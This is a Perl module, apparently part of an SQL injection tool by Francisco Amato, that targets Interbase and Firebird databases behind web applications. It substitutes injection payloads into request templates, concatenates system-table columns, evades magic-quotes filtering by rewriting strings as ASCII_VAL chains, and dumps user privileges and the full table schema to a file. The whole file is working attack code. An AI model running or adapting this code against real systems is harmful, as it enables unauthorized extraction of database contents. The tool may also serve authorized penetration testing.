package isr_interbase;
use Data::Dump qw(dump);

#Author: Francisco Amato

#Tested in Interbase 8.0.0.27 /Yaffil/Firebird
my $version="8.0.0.27";

my @space=(' ');
#Atributos publicos

#Private variable
my @db_errors = (
	    {
             'code'  	=>'',
             'message'  =>'',
             'type'     =>0
            }
	    );

#SELECT DISTINCT RDB$USER FROM RDB$USER_PRIVILEGES;
my @col_testpage=('RDB$USER');
my $name_test='RDB$USER_PRIVILEGES';

my @col_dbschema=('\'$NODBNAME$\'','r.RDB$RELATION_NAME','r.RDB$FIELD_NAME','f.RDB$FIELD_TYPE');
my $name_dbschema='RDB$RELATION_FIELDS r LEFT JOIN RDB$FIELDS f ON r.RDB$FIELD_SOURCE = f.RDB$FIELD_NAME';
my $name_dbschematail='(RDB$RELATION_NAME not like \'RDB$%\' and RDB$RELATION_NAME not like \'TMP$%\')';

#Constructor y destructor de clase
sub new {
    my $classname = shift;
    my $class = {@_};

    #Atributos de instancia

    bless $class, $classname;
    return $class;
}

# Accessores y mutadores
sub get_testpage { my $class = shift; return $class->{testpage};}
sub get_dbschema { my $class = shift; return $class->{dbschema};}

#Public method
sub do_testpage {
    my $class = shift;
    $class->{testpage}=process_page($class,$name_test,-1,undef,undef,@col_testpage);
}

sub do_dbsnames {
    my $class = shift;
    $class->{error} = "Dbsnames not implement\n";
    $class->{dbsnames} = -1; # not implement
}


sub do_dbschema {
    my $class = shift;
    $class->{dbschema}=process_page($class,$name_dbschema,-1,$name_dbschematail,undef,@col_dbschema);
    die "Error: " . $class->{error} if ($class->{error});
    
    open(FF, "> ./template/$class->{conn}->{'session'}.dbschema");
        print FF $class->get_dbschema;
    close(FF);
		    
}

#Private method
sub process_page{

    my ($class,$table,$coltype,$where,$tail,@col) = @_;
    my $datos=$class->{conn}->{'inj'};
    my $val;
    my @ncol;
    
#    foreach(@col){
#	    push @ncol,"cast($_ as varchar(255))";
#    }

    #select
    $val = &getconcat(@col);
    
    #
    $table=~ s/\$NODBNAME\$\.//gi;
    
    #EXPERIMENTAL:
    $val = "cast($val as varchar(255))";

    #where
    my $mwhere;
    if($where){ #exist structure where
        $mwhere = "where $where";
        if ($class->{conn}->{'where'}){ #user define where
            $mwhere .= " and $class->{conn}->{'where'}";
        }
    }elsif($class->{conn}->{'where'}){
        $mwhere="where $class->{conn}->{'where'}";
    }

    #tail
    my $mtail=$class->{conn}->{'tail'};
    
    $datos=~ s/\<VALUE\>/$val/gi;
    $datos=~ s/\<TABLE\>/$table/gi;
    $datos=~ s/\<WHERE\>/$mwhere/gi;
    $datos=~ s/\<TAIL\>/$mtail/gi;

    #Magic quotes evasion
    $datos =~ s/'([^']+)'/magicquotes($1)/egi if $class->{conn}->{'magicquotes'}; #'	
    
    $class->{lastinj}=$datos;
    $class->{conn}->getpage("",$datos);
    if ($class->{conn}->{code} == 404){
	$class->{error} = "Error 404\n";
    }else{
	$class->{error}=check_errors($class->{conn}->{response});
    }
    return $class->{conn}->{response};
}

sub magicquotes {
    my ($val) = @_;
    my @list= map { $_ = 'ASCII_VAL('.$_.')' } unpack('C*', $val); #ASCII_VAL need be register to make available
    my $return = &getconcat(@list);
    $return =~ s/\|\|'\[\_\_\]'\|\|/\|\|/gi;
    return $return;
}
		    

sub check_errors {
    my ($response) = @_;
    my $ret="";
    foreach my $item (@db_errors){
	if ($response =~ /$item->{'code'}/){
	    $ret.="Code: $item->{'code'}, Detail: $item->{'message'}\n";
	}
    }
    return $ret;
}

sub getconcat {
        my (@items) =@_;
        my $can=$#items;
        my $str=getvalue($items[0]);
        for (my $i=1;$i <=$can;$i++)
        {
                $str.= "||'[__]'||".getvalue($items[$i]);
        }
        return $str;
}
sub getvalue {
    my ($str) = @_;
    if ($str){
        return $str;
    }else{
        return "'".$str."'";
    }
}
1;
